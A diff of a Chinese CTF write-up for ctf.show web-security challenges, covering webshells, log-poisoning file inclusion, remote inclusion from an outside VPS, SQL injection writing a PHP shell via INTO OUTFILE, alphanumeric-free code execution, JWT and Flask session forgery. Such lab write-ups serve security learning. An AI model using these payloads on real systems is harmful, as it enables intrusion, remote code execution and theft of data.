@@ -4,17 +4,17 @@ published: 2025-09-15
 pubDate: 2025-09-15
 description: Web应用安全与防护 wp
 pinned: false
-tags: ['web']
+tags: ["web"]
 author: zsm
 category: CTF-web
-draft: false 
+draft: false
 licenseName: "MIT"
-lang: 'zh_CN'
+lang: "zh_CN"
 ---
 
 # 第一章
 
-## Base64编码隐藏 
+## Base64编码隐藏
 
 源码
 
@@ -24,11 +24,11 @@ base64解码即可
 
 ## HTTP头注入
 
-直接输入密码提示`You must use "ctf-show-brower" browser to access this page`  
+直接输入密码提示`You must use "ctf-show-brower" browser to access this page`
 
 改UA头
 
-## Base64多层嵌套解码 
+## Base64多层嵌套解码
 
 加密逻辑
 
@@ -90,24 +90,24 @@ def validate_password(input_str):
 def find_password():
     correct_password = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
     step4 = base64.b64decode(correct_password).decode()
-    
+
     import string
     chars = string.ascii_letters + string.digits + '+/='
-    
+
     for c1 in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
         for c2 in chars:
             try:
                 full_step4 = c1 + c2 + step4
                 while len(full_step4) % 4 != 0:
                     full_step4 += '='
-                
+
                 decoded = base64.b64decode(full_step4).decode()
                 if decoded.startswith('aB3') and decoded.endswith('qW9'):
                     step3 = decoded[3:-3]
-                    
+
                     step2_rev = base64.b64decode(step3).decode()
                     step2 = ''.join(reversed(step2_rev))
-                    
+
                     for d1 in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                         for d2 in chars:
                             for d3 in chars:
@@ -115,16 +115,16 @@ def find_password():
                                     full_step2 = d1 + d2 + d3 + step2
                                     while len(full_step2) % 4 != 0:
                                         full_step2 += '='
-                                    
+
                                     decoded2 = base64.b64decode(full_step2).decode()
                                     if decoded2.endswith('xH7jK'):
                                         step1 = decoded2[:-5]
-                                        
+
                                         try:
                                             while len(step1) % 4 != 0:
                                                 step1 += '='
                                             original = base64.b64decode(step1).decode()
-                                            
+
                                             # 验证密码
                                             if validate_password(original):
                                                 return original
@@ -134,7 +134,7 @@ def find_password():
                                     continue
             except:
                 continue
-    
+
     return None
 
 result = find_password()
@@ -146,13 +146,13 @@ else:
 
 然后发过去，顺便改ua头
 
-## HTTPS中间人攻击 
+## HTTPS中间人攻击
 
-有两个文件，一个流量包一个`.log`文件  
+有两个文件，一个流量包一个`.log`文件
 
 发现TLS和TCP的内容都被加密了，把log文件配置到小鲨鱼里面，就会多出来两个流，得到flag
 
-## Cookie伪造 
+## Cookie伪造
 
 先上去要登陆，密码是`guest`，如何cookie里面改一下刷新就行了
 
@@ -160,7 +160,7 @@ else:
 
 ## 一句话木马变形
 
-可以执行命令，`phpinfo();`没有flag  
+可以执行命令，`phpinfo();`没有flag
 
 `system(ls);`得到回显
 
@@ -168,7 +168,7 @@ else:
 <br />
 <b>Warning</b>:  Use of undefined constant ls - assumed 'ls' (this will throw an Error in a future version of PHP) in <b>/var/www/html/index.php(107) : eval()'d code</b> on line <b>1</b><br />
 flag.php
-index.php 
+index.php
 ```
 
 尝试直接读取不行
@@ -181,17 +181,17 @@ Error: Invalid characters detected! Only letters, numbers, underscores ,parenthe
 
 > readfile(next(array_reverse(scandir(getcwd()))));
 
-## 反弹shell构造 
+## 反弹shell构造
 
 执行ls没有效果，nc弹shell即可
 
-## 管道符绕过过滤 
+## 管道符绕过过滤
 
 直接执行，可以看见flag.php，这里管道符直接执行
 
-> |cat flag.php 
+> |cat flag.php
 
-## 无字母数字代码执行 
+## 无字母数字代码执行
 
 打取反绕过
 
@@ -208,9 +208,9 @@ var_dump(urlencode(~'cat flag.php'));
 
 > (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
 
-## 无字母数字命令执行 
+## 无字母数字命令执行
 
-一个很奇怪的题，本来想着利用工具去试试，发现无回显  
+一个很奇怪的题，本来想着利用工具去试试，发现无回显
 
 这里尝试弹shell，传上去的文件是空的，不知道为什么。
 
@@ -320,16 +320,16 @@ for t in threads:
     t.join()
 
 ```
+
 # 第三章
 
+## 日志文件包含
 
-## 日志文件包含 
-
-文件包含加上ua头bro，nginx的日志路径是`/var/log/nginx/access.log`  
+文件包含加上ua头bro，nginx的日志路径是`/var/log/nginx/access.log`
 
 先GET传个ua头的马上去`<?php eval($_GET['cmd']); ?>`，然后post拿flag,`/?cmd=system('cat%20flag.php');`
 
-##  php://filter读取源码
+## php://filter读取源码
 
 先读源码`php://filter/convert.base64-encode/resource=index.php`，有个`db.php`，继续读`php://filter/convert.base64-encode/resource=db.php`，拿到flag
 
@@ -339,7 +339,7 @@ vps起个python服务，让靶机下个马，然后读flag
 
 > https://f5c7f449-1057-46e6-b493-f2217cb1f51a.challenge.ctf.show/?path=http://121.41.100.198:9001/1.txt&1=system(%27tac%20f*%27);
 
-## 路径遍历突破 
+## 路径遍历突破
 
 先看看源码，输入`index.php`即可
 
@@ -371,7 +371,7 @@ echo '<span style="color:#888;">目标flag文件为/flag.txt</span>';
 
 目录穿越，不能../开头，加个不存在的开头`zsm/../../../../../../../../flag.txt`
 
-## 临时文件包含 
+## 临时文件包含
 
 这个脚本一把梭哈
 
@@ -417,11 +417,11 @@ evnet.set()
 
 # 第四章
 
-## Session固定攻击 
+## Session固定攻击
 
 登陆上去，然后发送信息，回去刷新一下就行了
 
-## JWT令牌伪造 
+## JWT令牌伪造
 
 随便一个id拿到jwt，网上解析一下，伪造成none.
 
@@ -450,9 +450,9 @@ print(jwt)
 
 ```
 
-## Flask_Session伪造 
+## Flask_Session伪造
 
-点进去说什么爬虫，点链接，url`https://71821fb8-a919-4c24-99b8-6a4b34764937.challenge.ctf.show/read?url=https://baidu.com`，这个就很抽象  
+点进去说什么爬虫，点链接，url`https://71821fb8-a919-4c24-99b8-6a4b34764937.challenge.ctf.show/read?url=https://baidu.com`，这个就很抽象
 
 尝试伪协议读取,`file:///etc/passwd`，尝试读取源码，flask在`app/app.py`,
 
@@ -505,9 +505,9 @@ if __name__ == '__main__':
     app.run(debug=False, host="0.0.0.0")
 ```
 
-这里不允许url出现flag，那就无法直接读取了，查了一下，下面我们要伪造flask的session。  
+这里不允许url出现flag，那就无法直接读取了，查了一下，下面我们要伪造flask的session。
 
-这里需要key，key可以通过mac地址读取。`read?url=file:///sys/class/net/eth0/address`.  
+这里需要key，key可以通过mac地址读取。`read?url=file:///sys/class/net/eth0/address`.
 
 ```python
 import random
@@ -527,36 +527,36 @@ python flask_session_cookie_manager3.py encode -s "21.01424233154766" -t "{'user
 
 eyJ1c2VybmFtZSI6ImFkbWluIn0.aL-MLQ.uNkIc07sRnDEAULn6-_KJiZ5nb0
 ```
+
 替换拿flag即可
 
-
-## 弱口令爆破 
+## 弱口令爆破
 
 爆破即可
 
-
 # 第五章
 
-## 联合查询注入 
+## 联合查询注入
 
 尝试sqlmap，
+
 ```
 sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id --dbs --batch
-sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id -D ctfshow_page_informations --tables --batch 
+sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id -D ctfshow_page_informations --tables --batch
 sqlmap -u "https://61847c0f-54cb-4da6-8115-a43decc745a3.challenge.ctf.show/?id=4" -p id -D ctfshow_page_informations -T users --dump --batch
 ```
 
-## 布尔盲注爆破 
+## 布尔盲注爆破
 
 用户名和密码都可以注入，联合查询写入webshell，
 
->password=1' union select 1,2,3,'<?php eval($_POST[1]);?>' into outfile'/var/www/html/1.php'%23&username=1
+> password=1' union select 1,2,3,'<?php eval($_POST[1]);?>' into outfile'/var/www/html/1.php'%23&username=1
 
 蚁剑连接上去，`conn.php`里面有数据库连接密码，连接上去，然后拿flag
 
-## 堆叠注入写Shell 
+## 堆叠注入写Shell
 
-bp里面fuzz字典跑一下，发现用户名是`\`的响应不一样，尝试密码去注入`or 1=1#`，成功登陆，再继续尝试sleep发现有效果。  
+bp里面fuzz字典跑一下，发现用户名是`\`的响应不一样，尝试密码去注入`or 1=1#`，成功登陆，再继续尝试sleep发现有效果。
 
 尝试写马，发现他把单引号ban了，双引号继续写入就行了，flag在根目录
 
@@ -564,3 +564,26 @@ bp里面fuzz字典跑一下，发现用户名是`\`的响应不一样，尝试�
 
 不知道waf了什么，还是继续写马，phpinfo可以直接写入
 
+# 第六章
+
+## 混合型XSS
+
+先登录上去，有个签名框，应该是在这个里面弹
+
+## 编码绕过XSS过滤
+
+# 第七章
+
+## 请求伪造漏洞\_CSRF
+
+## 最简单的SSRF
+
+## SSRF打Redis
+
+# 第八章
+
+## 绕过MIME检测上传webshell
+
+## htaccess攻击
+
+## Exif注释包含恶意代码
